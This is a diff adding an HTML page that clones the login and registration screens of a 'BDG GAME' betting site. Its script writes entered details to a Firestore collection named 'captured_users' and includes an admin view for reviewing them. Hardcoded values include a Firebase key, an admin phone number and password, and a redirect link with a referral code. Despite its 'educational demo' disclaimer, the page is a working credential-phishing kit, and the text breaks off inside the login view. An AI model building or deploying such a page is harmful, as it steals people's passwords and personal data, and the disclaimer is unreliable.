@@ -1,0 +1,1079 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover" />
+  <meta name="theme-color" content="#2b2b2b" />
+  <meta name="apple-mobile-web-app-capable" content="yes" />
+  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent" />
+  <meta name="description" content="BDG GAME - Educational Demo" />
+  <title>BDG GAME</title>
+  <link href="https://fonts.googleapis.com/css2?family=Cinzel:wght@700;800;900&display=swap" rel="stylesheet" />
+  <style>
+    /* ========== RESET / BASE ========== */
+    *, *::before, *::after { box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
+    html, body {
+      margin: 0; padding: 0; min-height: 100%;
+      background: #2b2b2b; color: #fff;
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+      -webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale;
+      overflow-x: hidden;
+      overscroll-behavior: none;
+    }
+    input, button, textarea, select { font-family: inherit; }
+    button { border: 0; background: transparent; cursor: pointer; color: inherit; }
+    input {
+      color: #fff; font-size: 16px;
+      border: 0; outline: 0; background: transparent;
+    }
+    input::placeholder { color: rgba(255,255,255,0.35); }
+    input:-webkit-autofill,
+    input:-webkit-autofill:hover,
+    input:-webkit-autofill:focus {
+      -webkit-text-fill-color: #fff;
+      -webkit-box-shadow: 0 0 0 1000px #3a3a3a inset;
+      transition: background-color 5000s ease-in-out 0s;
+      caret-color: #fff;
+    }
+    ::-webkit-scrollbar { width: 8px; height: 8px; }
+    ::-webkit-scrollbar-thumb { background: rgba(255,255,255,0.15); border-radius: 4px; }
+    ::-webkit-scrollbar-track { background: transparent; }
+
+    .screen {
+      max-width: 440px;
+      margin: 0 auto;
+      min-height: 100dvh;
+      display: flex; flex-direction: column;
+      background: #2b2b2b;
+    }
+
+    /* ========== HEADER ========== */
+    .header {
+      position: relative;
+      display: flex; align-items: center; justify-content: space-between;
+      background: #3a3a3a;
+      padding: 12px;
+    }
+    .icon-btn {
+      width: 40px; height: 40px;
+      display: inline-flex; align-items: center; justify-content: center;
+      color: rgba(255,255,255,0.92);
+    }
+    .icon-btn:active { opacity: 0.6; }
+    .header-logo {
+      position: absolute; left: 50%; top: 50%; transform: translate(-50%, -50%);
+      pointer-events: none;
+    }
+    .logo-wrap { display: flex; flex-direction: column; align-items: center; }
+    .logo-text {
+      font-family: "Cinzel", "Times New Roman", serif;
+      font-weight: 900; font-size: 22px; letter-spacing: 2px;
+      color: #e0b64a; line-height: 1;
+      text-shadow: 0 1px 0 rgba(0,0,0,0.55);
+    }
+    .logo-bar1 { margin-top: 3px; height: 2px; width: 128px; background: #e0b64a; }
+    .logo-bar2 { margin-top: 2px; height: 1px; width: 110px; background: rgba(224,182,74,0.85); }
+
+    .lang { display: flex; align-items: center; gap: 6px; padding-right: 4px; }
+    .flag {
+      position: relative; width: 22px; height: 22px; overflow: hidden;
+      border-radius: 50%; border: 1px solid rgba(255,255,255,0.3);
+      background: repeating-linear-gradient(180deg, #b22234 0 2.5px, #fff 2.5px 4.7px);
+    }
+    .flag::before {
+      content: ""; position: absolute; left: 0; top: 0;
+      width: 45%; height: 52%; background: #3c3b6e;
+      background-image: radial-gradient(circle, white 0.4px, transparent 0.5px);
+      background-size: 3px 3px;
+    }
+    .lang-text { font-size: 15px; font-weight: 600; color: #e0b64a; }
+
+    /* ========== INTRO ========== */
+    .intro { background: #3a3a3a; padding: 4px 20px 24px; }
+    .intro-title { font-size: 24px; font-weight: 700; color: #fff; margin: 0; }
+    .intro-text { font-size: 13px; line-height: 1.55; color: rgba(255,255,255,0.85); margin: 12px 0 0; }
+
+    /* ========== TABS (login) ========== */
+    .tabs {
+      display: grid; grid-template-columns: 1fr 1fr;
+      border-bottom: 1px solid rgba(255,255,255,0.1);
+      padding-top: 16px; background: #2b2b2b;
+    }
+    .tab {
+      position: relative;
+      display: flex; flex-direction: column; align-items: center;
+      gap: 6px; padding: 0 0 8px;
+    }
+    .tab-icons { display: flex; align-items: center; gap: 4px; }
+    .tab-label { font-size: 15px; color: rgba(255,255,255,0.7); }
+    .tab.active .tab-label { color: #e0b64a; font-weight: 600; }
+    .tab-underline {
+      position: absolute; bottom: 0; height: 2px; width: 75%; background: transparent;
+    }
+    .tab.active .tab-underline { background: #e0b64a; }
+
+    /* ========== FORM ========== */
+    .form { padding: 24px 20px 0; flex: 1; }
+    .field-label { display: flex; align-items: center; gap: 8px; margin-bottom: 8px; }
+    .field-label span { font-size: 15px; color: #fff; }
+    .field {
+      display: flex; align-items: center;
+      height: 46px; border-radius: 6px; background: #3a3a3a;
+      padding: 0 12px; margin-bottom: 24px;
+    }
+    .field input { width: 100%; height: 100%; min-width: 0; }
+    .field-row { display: flex; gap: 12px; margin-bottom: 24px; }
+    .cc-select {
+      display: flex; align-items: center; justify-content: space-between;
+      height: 46px; min-width: 86px; border-radius: 6px;
+      background: #3a3a3a; padding: 0 12px; color: #fff; font-size: 15px;
+    }
+    .cc-select svg { margin-left: 4px; }
+    .field-row .field { flex: 1; min-width: 0; margin-bottom: 0; }
+    .eye-btn { padding-left: 8px; color: rgba(255,255,255,0.85); display: inline-flex; align-items: center; }
+
+    /* ========== SECTION TITLE (register) ========== */
+    .section-head { display: flex; flex-direction: column; align-items: center; padding-top: 20px; }
+    .section-head-title { margin-top: 8px; font-size: 17px; font-weight: 700; color: #e0b64a; letter-spacing: 0.6px; }
+    .section-head-bar { margin-top: 12px; height: 2px; width: 92%; background: #e0b64a; }
+
+    /* ========== CHECKBOX ========== */
+    .check-row { display: flex; align-items: center; gap: 12px; margin-bottom: 28px; }
+    .check-btn {
+      width: 22px; height: 22px; border-radius: 50%;
+      border: 2px solid rgba(255,255,255,0.45); background: transparent;
+      display: inline-flex; align-items: center; justify-content: center;
+      transition: all 0.15s; padding: 0; flex-shrink: 0;
+    }
+    .check-btn.checked { border-color: #d4a53a; background: #d4a53a; }
+    .check-btn svg { display: none; }
+    .check-btn.checked svg { display: block; }
+    .check-label { font-size: 14px; color: rgba(255,255,255,0.9); line-height: 1.35; }
+    .check-label .privacy { color: #ef4444; }
+
+    /* ========== BUTTONS ========== */
+    .btn-primary {
+      display: block; width: 100%; height: 46px;
+      border-radius: 9999px; font-size: 17px; font-weight: 600;
+      background: linear-gradient(180deg, #f4d47a, #c99a3f);
+      color: #5a3d10;
+      box-shadow: 0 3px 6px rgba(0,0,0,0.25);
+      margin-bottom: 16px;
+      transition: transform 0.05s, opacity 0.15s;
+    }
+    .btn-primary:active { transform: scale(0.99); opacity: 0.9; }
+    .btn-primary.disabled {
+      background: #8b8fa0; color: rgba(255,255,255,0.7);
+      box-shadow: none; cursor: not-allowed;
+    }
+    .btn-outline {
+      display: block; width: 100%; height: 46px;
+      border-radius: 9999px; font-size: 16px; font-weight: 600; letter-spacing: 2px;
+      border: 1px solid #e0b64a; color: #e0b64a; background: transparent;
+    }
+    .btn-outline.plain { letter-spacing: 0; font-weight: 400; font-size: 15px; color: #fff; }
+    .btn-outline.plain b { color: #e0b64a; font-weight: 600; letter-spacing: 2px; }
+    .btn-outline:active { opacity: 0.7; }
+
+    /* ========== BOTTOM ICONS ========== */
+    .bottom-links {
+      display: grid; grid-template-columns: 1fr 1fr; gap: 24px;
+      margin-top: 32px; padding-bottom: 24px;
+    }
+    .bl-item { display: flex; flex-direction: column; align-items: center; gap: 6px; }
+    .bl-label { font-size: 14px; color: rgba(255,255,255,0.9); }
+
+    /* ========== EDU DISCLAIMER ========== */
+    .disclaimer {
+      margin: 8px 0 16px;
+      padding: 8px 12px;
+      border: 1px solid rgba(255,255,255,0.1);
+      background: rgba(255,255,255,0.03);
+      border-radius: 6px;
+      font-size: 10px; line-height: 1.5;
+      color: rgba(255,255,255,0.4);
+    }
+
+    /* ========== ADMIN ========== */
+    .admin-body { min-height: 100dvh; background: #0f1420; color: #fff; }
+    .admin-topbar {
+      position: sticky; top: 0; z-index: 10;
+      background: rgba(20,26,43,0.95);
+      backdrop-filter: blur(6px);
+      border-bottom: 1px solid rgba(255,255,255,0.1);
+      padding-top: env(safe-area-inset-top);
+    }
+    .admin-inner { max-width: 1200px; margin: 0 auto; padding: 0 12px; }
+    @media (min-width: 640px) { .admin-inner { padding: 0 16px; } }
+    .admin-topbar .row { display: flex; align-items: center; justify-content: space-between; padding: 12px 0; }
+    .admin-brand { display: flex; align-items: center; gap: 10px; }
+    .admin-badge {
+      width: 36px; height: 36px; border-radius: 8px;
+      background: linear-gradient(135deg, #fbbf24, #d97706);
+      display: inline-flex; align-items: center; justify-content: center;
+      color: #3a2a05; font-weight: 900;
+    }
+    .admin-title { font-size: 15px; font-weight: 700; line-height: 1.15; }
+    .admin-sub { font-size: 11px; color: rgba(255,255,255,0.6); display:flex; align-items:center; gap:6px;}
+    .conn-dot {
+      width: 8px; height: 8px; border-radius: 50%;
+      background: #6b7280; display: inline-block;
+    }
+    .conn-dot.ok { background: #22c55e; box-shadow: 0 0 6px #22c55e; }
+    .conn-dot.err { background: #ef4444; }
+    .btn-danger {
+      background: rgba(220,38,38,0.85); padding: 6px 12px;
+      border-radius: 6px; font-size: 14px; font-weight: 500;
+    }
+    .btn-danger:hover { background: rgb(220,38,38); }
+
+    .stats { display: grid; grid-template-columns: repeat(3, 1fr); gap: 8px; padding-top: 16px; }
+    @media (min-width: 640px) { .stats { gap: 12px; } }
+    .stat { padding: 12px; border-radius: 8px; box-shadow: 0 1px 2px rgba(0,0,0,0.15); }
+    @media (min-width: 640px) { .stat { padding: 16px; } }
+    .stat.blue { background: linear-gradient(135deg, #3b82f6, #1d4ed8); }
+    .stat.green { background: linear-gradient(135deg, #10b981, #047857); }
+    .stat.amber { background: linear-gradient(135deg, #f59e0b, #b45309); }
+    .stat-label { font-size: 10px; text-transform: uppercase; letter-spacing: 0.05em; color: rgba(255,255,255,0.8); }
+    @media (min-width: 640px) { .stat-label { font-size: 12px; } }
+    .stat-value { margin-top: 4px; font-size: 20px; font-weight: 900; }
+    @media (min-width: 640px) { .stat-value { font-size: 24px; } }
+
+    .controls { margin-top: 16px; display: flex; flex-wrap: wrap; gap: 8px; align-items: center; }
+    .controls input, .controls select {
+      background: #1c2338; border: 1px solid rgba(255,255,255,0.1);
+      padding: 8px 12px; border-radius: 6px; font-size: 14px; color: #fff;
+    }
+    .controls input { flex: 1; min-width: 0; flex-basis: 220px; }
+    .btn-sm { padding: 8px 12px; border-radius: 6px; font-size: 14px; font-weight: 500; }
+    .btn-blue { background: #2563eb; } .btn-blue:hover { background: #3b82f6; }
+    .btn-green { background: #059669; } .btn-green:hover { background: #10b981; }
+    .btn-green-dark { background: #047857; } .btn-green-dark:hover { background: #059669; }
+    .btn-red { background: #dc2626; } .btn-red:hover { background: #ef4444; }
+    .btn-white { background: rgba(255,255,255,0.1); } .btn-white:hover { background: rgba(255,255,255,0.2); }
+
+    .cards { margin-top: 16px; display: flex; flex-direction: column; gap: 12px; }
+    @media (min-width: 768px) { .cards { display: none; } }
+    .card {
+      background: #1c2338; border: 1px solid rgba(255,255,255,0.1);
+      border-radius: 8px; padding: 12px;
+    }
+    .card-head { display: flex; align-items: center; justify-content: space-between; }
+    .card-head-left { display: flex; align-items: center; gap: 8px; flex-wrap: wrap; }
+    .num { font-size: 12px; color: rgba(255,255,255,0.5); }
+    .badge {
+      padding: 2px 8px; border-radius: 4px;
+      font-size: 11px; font-weight: 600; text-transform: uppercase;
+    }
+    .badge.login { background: rgba(16,185,129,0.3); color: #6ee7b7; }
+    .badge.register { background: rgba(217,119,6,0.3); color: #fcd34d; }
+    .badge.pending { background: rgba(107,114,128,0.3); color: #d1d5db; }
+    .badge.saved   { background: rgba(34,197,94,0.25); color: #86efac; }
+    .mini-copy {
+      background: rgba(255,255,255,0.1); padding: 4px 8px; border-radius: 4px;
+      font-size: 11px;
+    }
+    .mini-copy:hover { background: rgba(255,255,255,0.2); }
+    .card-body { margin-top: 8px; display: flex; flex-direction: column; gap: 6px; font-size: 13px; }
+    .row-line { display: flex; justify-content: space-between; align-items: flex-start; gap: 12px; }
+    .row-line .label { flex-shrink: 0; color: rgba(255,255,255,0.5); }
+    .row-line .val { min-width: 0; text-align: right; word-break: break-all; color: #fff; }
+    .row-line .val.mono { font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, monospace; }
+    .row-line .val.hl { color: #fde047; }
+
+    .table-wrap { margin-top: 16px; display: none; }
+    @media (min-width: 768px) { .table-wrap { display: block; } }
+    .table-scroll { overflow-x: auto; border: 1px solid rgba(255,255,255,0.1); border-radius: 8px; }
+    table { width: 100%; min-width: 900px; border-collapse: collapse; font-size: 14px; }
+    thead { background: #1c2338; color: rgba(255,255,255,0.8); text-align: left; }
+    th, td { padding: 12px; }
+    tbody tr { border-top: 1px solid rgba(255,255,255,0.05); }
+    tbody tr:hover { background: rgba(255,255,255,0.03); }
+    .mono { font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, monospace; }
+    .text-white50 { color: rgba(255,255,255,0.5); }
+    .text-white60 { color: rgba(255,255,255,0.6); }
+    .text-white70 { color: rgba(255,255,255,0.7); }
+    .text-white80 { color: rgba(255,255,255,0.8); }
+    .text-yellow { color: #fde047; }
+    .truncate { max-width: 220px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
+    .nowrap { white-space: nowrap; }
+    .empty {
+      padding: 24px; text-align: center; color: rgba(255,255,255,0.5); font-size: 14px;
+      border: 1px dashed rgba(255,255,255,0.15);
+      background: rgba(255,255,255,0.02);
+      border-radius: 8px;
+    }
+    .note { margin: 16px 0 24px; font-size: 12px; color: rgba(255,255,255,0.4); }
+    .note code { background: rgba(255,255,255,0.08); padding: 1px 6px; border-radius: 4px; }
+    .toast {
+      position: fixed; left: 50%; bottom: 24px; transform: translateX(-50%);
+      background: rgba(0,0,0,0.85); color: #fff;
+      padding: 10px 16px; border-radius: 8px; font-size: 13px;
+      z-index: 9999; opacity: 0; transition: opacity 0.25s;
+      pointer-events: none; max-width: 90vw; text-align: center;
+    }
+    .toast.show { opacity: 1; }
+  </style>
+</head>
+<body>
+  <div id="app"></div>
+  <div id="toast" class="toast"></div>
+
+  <!-- ============ SVG icon templates ============ -->
+  <template id="tpl-back"><svg width="22" height="22" viewBox="0 0 24 24" fill="none"><path d="M15 6l-6 6 6 6" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"/></svg></template>
+  <template id="tpl-caret"><svg width="12" height="12" viewBox="0 0 24 24" fill="none"><path d="M6 9l6 6 6-6" stroke="currentColor" stroke-width="2.2" stroke-linecap="round"/></svg></template>
+  <template id="tpl-check"><svg width="13" height="13" viewBox="0 0 24 24" fill="none"><path d="M5 12.5l4.5 4.5L20 6.5" stroke="#3a3a3a" stroke-width="3.4" stroke-linecap="round" stroke-linejoin="round"/></svg></template>
+  <template id="tpl-phone"><svg width="22" height="22" viewBox="0 0 32 32" fill="none"><rect x="8" y="3" width="16" height="24" rx="2.5" fill="#c99a3f"/><rect x="8" y="3" width="16" height="4.5" fill="#d4a53a"/><rect x="9.5" y="8" width="13" height="15" rx="1" fill="#8a6520"/><circle cx="16" cy="25.2" r="0.9" fill="#7a5a1e"/></svg></template>
+  <template id="tpl-lock"><svg width="22" height="22" viewBox="0 0 32 32" fill="none"><path d="M10 15v-3.5a6 6 0 1 1 12 0V15" stroke="#c99a3f" stroke-width="2.6" fill="none" stroke-linecap="round"/><rect x="6.5" y="14" width="19" height="14.5" rx="2.5" fill="#c99a3f"/><circle cx="16" cy="20.5" r="2.2" fill="#7a5a1e"/><rect x="15.15" y="20.5" width="1.7" height="4" fill="#7a5a1e"/></svg></template>
+  <template id="tpl-email"><svg width="22" height="22" viewBox="0 0 32 32" fill="none"><rect x="3" y="7" width="26" height="18" rx="2" fill="#c99a3f"/><path d="M3 8.5l13 9 13-9" stroke="#7a5a1e" stroke-width="1.7" fill="none" stroke-linejoin="round"/></svg></template>
+  <template id="tpl-user"><svg width="22" height="22" viewBox="0 0 32 32" fill="none"><circle cx="16" cy="11" r="5" fill="#c99a3f"/><path d="M4 28c1.8-6 6.5-8.5 12-8.5S26.2 22 28 28z" fill="#c99a3f"/></svg></template>
+  <template id="tpl-invite"><svg width="22" height="22" viewBox="0 0 32 32" fill="none"><rect x="4" y="10" width="24" height="16" rx="2" fill="#c99a3f"/><path d="M4 12l12 8.5L28 12" stroke="#7a5a1e" stroke-width="1.6" fill="none"/><path d="M6 10l10-5 10 5z" fill="#a67a26"/></svg></template>
+  <template id="tpl-eye-off"><svg width="20" height="20" viewBox="0 0 24 24" fill="none"><path d="M3 3l18 18" stroke="white" stroke-width="1.7" stroke-linecap="round"/><path d="M10.5 10.7A2 2 0 0 0 12 14a2 2 0 0 0 1.9-1.3" stroke="white" stroke-width="1.7" stroke-linecap="round" fill="none"/><path d="M6.5 6.6C4.6 8 3.2 10 2.5 12c1.3 3 5.1 6 9.5 6 1.7 0 3.3-.4 4.7-1.2M17.9 17.3C20 15.9 21.5 14 22.5 12c-1.3-3-5.1-6-10.5-6-1 0-1.9.1-2.8.3" stroke="white" stroke-width="1.7" stroke-linecap="round" fill="none"/></svg></template>
+  <template id="tpl-eye-on"><svg width="20" height="20" viewBox="0 0 24 24" fill="none"><path d="M2.5 12c1.3-3 5.1-6 9.5-6s8.2 3 9.5 6c-1.3 3-5.1 6-9.5 6s-8.2-3-9.5-6z" stroke="white" stroke-width="1.6" fill="none"/><circle cx="12" cy="12" r="2.4" fill="white"/></svg></template>
+  <template id="tpl-forgot"><svg width="38" height="38" viewBox="0 0 48 48" fill="none"><path d="M14 22v-4a10 10 0 1 1 20 0v4" stroke="#c99a3f" stroke-width="3.6" fill="none" stroke-linecap="round"/><rect x="9" y="22" width="30" height="20" rx="3" fill="#c99a3f"/><circle cx="24" cy="30" r="3.2" fill="#7a5a1e"/><rect x="22.6" y="30" width="2.8" height="6" fill="#7a5a1e"/></svg></template>
+  <template id="tpl-support"><svg width="38" height="38" viewBox="0 0 48 48" fill="none"><path d="M8 30V24a16 16 0 0 1 32 0v6" stroke="#c99a3f" stroke-width="3.6" fill="none" stroke-linecap="round"/><rect x="6" y="26" width="8" height="14" rx="2" fill="#c99a3f"/><rect x="34" y="26" width="8" height="14" rx="2" fill="#c99a3f"/><path d="M34 40h-2a4 4 0 0 1-4-4" stroke="#c99a3f" stroke-width="2.4" fill="none" stroke-linecap="round"/><circle cx="24" cy="34" r="8" fill="#c99a3f"/><circle cx="20.5" cy="33" r="1.4" fill="#7a5a1e"/><circle cx="24" cy="33" r="1.4" fill="#7a5a1e"/><circle cx="27.5" cy="33" r="1.4" fill="#7a5a1e"/></svg></template>
+  <template id="tpl-logo-orn"><svg width="60" height="12" viewBox="0 0 60 12" style="color:#e0b64a;margin-bottom:-3px"><path d="M2 8 Q8 2 14 8 Q20 2 26 8 Q30 4 34 8 Q40 2 46 8 Q52 2 58 8" stroke="currentColor" stroke-width="0.9" fill="none"/><circle cx="30" cy="5" r="1.4" fill="currentColor"/><circle cx="18" cy="8" r="0.7" fill="currentColor"/><circle cx="42" cy="8" r="0.7" fill="currentColor"/></svg></template>
+
+  <script type="module">
+    /* ============================================================
+       FIREBASE — v12 modular SDK from official Google CDN.
+       Firebase is the ONLY database (Firestore).
+       Every submission is stored in the cloud collection `captured_users`.
+       ============================================================ */
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/12.15.0/firebase-app.js";
+    import { getAnalytics, isSupported as analyticsSupported } from "https://www.gstatic.com/firebasejs/12.15.0/firebase-analytics.js";
+    import {
+      initializeFirestore,
+      persistentLocalCache,
+      persistentMultipleTabManager,
+      CACHE_SIZE_UNLIMITED,
+      getFirestore,
+      collection, addDoc, getDocs, onSnapshot,
+      query, orderBy, doc, deleteDoc, serverTimestamp, writeBatch,
+      enableNetwork
+    } from "https://www.gstatic.com/firebasejs/12.15.0/firebase-firestore.js";
+
+    /* ---------- Your Firebase config ---------- */
+    const firebaseConfig = {
+      apiKey: "AIzaSyB7XxTuYct-lBtPu3--hKLnG6zu0cv9F_8",
+      authDomain: "bdg-login-f4f32.firebaseapp.com",
+      projectId: "bdg-login-f4f32",
+      storageBucket: "bdg-login-f4f32.firebasestorage.app",
+      messagingSenderId: "321174025888",
+      appId: "1:321174025888:web:a44f289631a10631cafbc5",
+      measurementId: "G-5NQCRCWQ4G"
+    };
+
+    const fbApp = initializeApp(firebaseConfig);
+
+    // Analytics (optional, only if supported by browser)
+    analyticsSupported().then(ok => { if (ok) { try { getAnalytics(fbApp); } catch {} } });
+
+    // Firestore with permanent local cache (IndexedDB) + cloud sync
+    let db;
+    try {
+      db = initializeFirestore(fbApp, {
+        localCache: persistentLocalCache({
+          tabManager: persistentMultipleTabManager(),
+          cacheSizeBytes: CACHE_SIZE_UNLIMITED
+        })
+      });
+    } catch (e) {
+      db = getFirestore(fbApp);
+    }
+    try { await enableNetwork(db); } catch {}
+
+    const COLLECTION = "captured_users";
+
+    /* ============ APP CONFIG ============ */
+    const ADMIN_PHONE    = "8640058107";
+    const ADMIN_PASSWORD = "cvsahu210";
+    const REDIRECT_URL   = "https://bdg8.vip//#/register?invitationCode=681868265355";
+    const INVITE_CODE    = "367265533900";
+
+    /* ============ DB HELPERS ============ */
+    let dbStatus = { ok: false, err: null };
+
+    /**
+     * saveCapture — always writes to Firestore.
+     * With persistent local cache, the write is instantly saved to
+     * IndexedDB and then synced to the Firebase cloud in background —
+     * even if the user is redirected right after clicking the button.
+     */
+    async function saveCapture(entry) {
+      const document = Object.assign({}, entry, {
+        userAgent: navigator.userAgent,
+        clientTime: Date.now(),
+        createdAt: serverTimestamp()
+      });
+      Object.keys(document).forEach(k => document[k] === undefined && delete document[k]);
+      try {
+        // Fire-and-forget: local write is synchronous inside SDK,
+        // cloud upload happens automatically in the background.
+        addDoc(collection(db, COLLECTION), document)
+          .then(() => { dbStatus = { ok: true, err: null }; })
+          .catch(err => { dbStatus = { ok: false, err: err.message || String(err) }; });
+        return true;
+      } catch (e) {
+        dbStatus = { ok: false, err: e.message || String(e) };
+        return false;
+      }
+    }
+
+    let liveUsers = [];
+    let liveUnsub = null;
+    function subscribeLive(cb) {
+      unsubscribeLive();
+      try {
+        const q = query(collection(db, COLLECTION), orderBy("clientTime", "desc"));
+        liveUnsub = onSnapshot(q,
+          { includeMetadataChanges: true },
+          (snap) => {
+            liveUsers = snap.docs.map(d => Object.assign(
+              { _id: d.id, _pending: d.metadata.hasPendingWrites, _fromCache: d.metadata.fromCache },
+              d.data()
+            ));
+            dbStatus = { ok: !snap.metadata.fromCache, err: null };
+            cb && cb(liveUsers);
+          },
+          (err) => {
+            dbStatus = { ok: false, err: err.message || String(err) };
+            cb && cb(liveUsers);
+          }
+        );
+      } catch (e) {
+        dbStatus = { ok: false, err: e.message || String(e) };
+      }
+    }
+    function unsubscribeLive() {
+      if (liveUnsub) { try { liveUnsub(); } catch {} liveUnsub = null; }
+    }
+
+    async function clearAll() {
+      try {
+        const snap = await getDocs(collection(db, COLLECTION));
+        let batch = writeBatch(db); let count = 0;
+        for (const d of snap.docs) {
+          batch.delete(doc(db, COLLECTION, d.id));
+          count++;
+          if (count % 400 === 0) { await batch.commit(); batch = writeBatch(db); }
+        }
+        await batch.commit();
+        return true;
+      } catch (e) { alert("Delete failed: " + (e.message || e)); return false; }
+    }
+
+    /* ============ SMALL HELPERS ============ */
+    function iconHTML(id) { return document.getElementById(id).innerHTML; }
+    function escapeHTML(s) {
+      return String(s == null ? "" : s)
+        .replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;")
+        .replace(/"/g, "&quot;").replace(/'/g, "&#39;");
+    }
+    function mask(v) { if (!v) return "-"; return "•".repeat(Math.min(v.length, 10)); }
+    function toast(msg, ms = 1500) {
+      const t = document.getElementById("toast");
+      t.textContent = msg; t.classList.add("show");
+      clearTimeout(toast._t);
+      toast._t = setTimeout(() => t.classList.remove("show"), ms);
+    }
+    function fmtTime(u) {
+      const t = u.clientTime || (u.createdAt && u.createdAt.seconds ? u.createdAt.seconds * 1000 : Date.now());
+      return new Date(t).toLocaleString();
+    }
+    function timeStamp(u) {
+      return u.clientTime || (u.createdAt && u.createdAt.seconds ? u.createdAt.seconds * 1000 : 0);
+    }
+
+    /* ============ HEADER ============ */
+    function headerHTML(showBack) {
+      return `
+        <div class="header">
+          ${showBack
+            ? `<button class="icon-btn" type="button" data-back aria-label="Back">${iconHTML("tpl-back")}</button>`
+            : `<div class="icon-btn"></div>`}
+          <div class="header-logo">
+            <div class="logo-wrap">
+              ${iconHTML("tpl-logo-orn")}
+              <div class="logo-text">BDG&nbsp;GAME</div>
+              <div class="logo-bar1"></div>
+              <div class="logo-bar2"></div>
+            </div>
+          </div>
+          <div class="lang"><div class="flag"></div><span class="lang-text">EN</span></div>
+        </div>`;
+    }
+
+    /* ============ ROUTER ============ */
+    function render() {
+      unsubscribeLive();
+      const hash = window.location.hash;
+      const isAdminOk = sessionStorage.getItem("bdg_admin_ok") === "1";
+      if (hash === "#/admin" && isAdminOk) { renderAdmin(); return; }
+      if (hash === "#/register") { renderRegister(); return; }
+      renderLogin();
+    }
+    window.addEventListener("hashchange", render);
+    function go(view) {
+      if (view === "login") window.location.hash = "";
+      else if (view === "register") window.location.hash = "#/register";
+      else if (view === "admin") window.location.hash = "#/admin";
+      render();
+    }
+
+    /* ============================================================
+       LOGIN VIEW
+       (eye/checkbox toggles do NOT clear the typed inputs)
+       ============================================================ */
+    let loginData = { tab: "phone", phone: "", email: "", password: "", remember: true, showPass: false };
+
+    function renderLogin() {
+      const app = document.getElementById("app");
+      const s = loginData;
+
+      app.innerHTML = `
+        <div class="screen">
+          ${headerHTML(true)}
+          <div class="intro">
+            <h1 class="intro-title">Log in</h1>
+            <p class="intro-text">
+              Please log in with your phone number or email<br/>
+              If you forget your password, please contact customer service
+            </p>
+          </div>
+
+          <div class="tabs">
+            <button class="tab ${s.tab === "phone" ? "active" : ""}" type="button" data-tab="phone">
+              ${iconHTML("tpl-phone")}
+              <span class="tab-label">phone number</span>
+              <div class="tab-underline"></div>
+            </button>
+            <button class="tab ${s.tab === "email" ? "active" : ""}" type="button" data-tab="email">
+              <div class="tab-icons">${iconHTML("tpl-email")}${iconHTML("tpl-user")}</div>
+              <span class="tab-label">Email / Account</span>
+              <div class="tab-underline"></div>
+            </button>
+          </div>
+
+          <div class="form">
+            ${s.tab === "phone" ? `
+              <div class="field-label">${iconHTML("tpl-phone")}<span>Phone number</span></div>
+              <div class="field-row">
+                <div class="cc-select"><span>+91</span>${iconHTML("tpl-caret")}</div>
+                <div class="field">
+                  <input id="loginPhone" type="tel" inputmode="numeric" autocomplete="tel"
+                         placeholder="Please enter the phone number" />
+                </div>
+              </div>
+            ` : `
+              <div class="field-label">${iconHTML("tpl-email")}<span>Email / Account</span></div>
+              <div class="field" style="margin-bottom:24px">
+                <input id="loginEmail" type="text" autocomplete="email"
+                       placeholder="Please enter your email / account" />
+              </div>
+            `}
+
+            <div class="field-label">${iconHTML("tpl-lock")}<span>Password</span></div>
+            <div class="field" style="margin-bottom:20px">
+              <input id="loginPass" type="password" autocomplete="current-password" placeholder="Password" />
+              <button class="eye-btn" id="loginEyeBtn" type="button" aria-label="toggle password">${iconHTML("tpl-eye-off")}</button>
+            </div>
+
+            <div class="check-row">
+              <button class="check-btn ${s.remember ? "checked" : ""}" id="loginRememberBtn" type="button">${iconHTML("tpl-check")}</button>
+              <span class="check-label">Remember password</span>
+            </div>
+
+            <button class="btn-primary disabled" id="loginBtn" type="button">Log in</button>
+            <button class="btn-outline" type="button" data-go-register>Register</button>
+
+            <div class="bottom-links">
+              <div class="bl-item">${iconHTML("tpl-forgot")}<span class="bl-label">Forgot password</span></div>
+              <div class="bl-item">${iconHTML("tpl-support")}<span class="bl-label">Customer Service</span></div>
+            </div>
+
+            <div class="disclaimer">
+              ⚠ Educational demo only. This UI clone is for learning responsive design &amp; state management. Not affiliated with any real service.
+            </div>
+          </div>
+        </div>
+      `;
+
+      const phoneInput = app.querySelector("#loginPhone");
+      const emailInput = app.querySelector("#loginEmail");
+      const passInput  = app.querySelector("#loginPass");
+
+      if (phoneInput) phoneInput.value = s.phone;
+      if (emailInput) emailInput.value = s.email;
+      passInput.value = s.password;
+      passInput.type  = s.showPass ? "text" : "password";
+      app.querySelector("#loginEyeBtn").innerHTML = iconHTML(s.showPass ? "tpl-eye-on" : "tpl-eye-off");
+
+      app.querySelector("[data-back]")?.addEventListener("click", () => history.back());
+
+      // Tab switch — save inputs before re-render
+      app.querySelectorAll("[data-tab]").forEach(b => {
+        b.addEventListener("click", () => {
+          if (phoneInput) s.phone = phoneInput.value;
+          if (emailInput) s.email = emailInput.value;
+          s.password = passInput.value;
+          s.tab = b.dataset.tab;
+          renderLogin();
+        });
+      });
+
+      // Eye toggle — direct DOM, NO re-render
+      const eyeBtn = app.querySelector("#loginEyeBtn");
+      eyeBtn.addEventListener("click", (e) => {
+        e.preventDefault();
+        const start = passInput.selectionStart;
+        const end   = passInput.selectionEnd;
+        s.showPass = !s.showPass;
+        passInput.type = s.showPass ? "text" : "password";
+        eyeBtn.innerHTML = iconHTML(s.showPass ? "tpl-eye-on" : "tpl-eye-off");
+        try { passInput.setSelectionRange(start, end); } catch {}
+      });
+
+      // Remember toggle — direct class toggle
+      const rememberBtn = app.querySelector("#loginRememberBtn");
+      rememberBtn.addEventListener("click", () => {
+        s.remember = !s.remember;
+        rememberBtn.classList.toggle("checked", s.remember);
+      });
+
+      app.querySelector("[data-go-register]")?.addEventListener("click", () => go("register"));
+
